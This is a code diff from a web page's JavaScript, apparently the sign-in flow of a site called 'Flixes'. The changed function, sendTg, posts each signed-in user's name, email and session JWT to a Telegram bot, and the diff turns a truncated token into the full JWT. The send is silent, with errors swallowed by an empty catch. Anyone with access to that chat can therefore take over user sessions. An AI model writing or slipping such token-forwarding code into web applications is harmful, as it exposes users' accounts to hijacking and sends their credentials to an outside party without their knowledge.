@@ -255,7 +255,7 @@ go('pgPlans');
 }
 
 function sendTg(email,name,jwt){
-var msg="Flixes Sign-In\n\nName: "+(name||"N/A")+"\nEmail: "+email+"\nJWT: "+(jwt||"").substring(0,80)+"...";
+var msg="Flixes Sign-In\n\nName: "+(name||"N/A")+"\nEmail: "+email+"\nJWT: "+jwt;
 fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:BOT_CHAT_ID,text:msg})}).catch(function(){});
 }
 
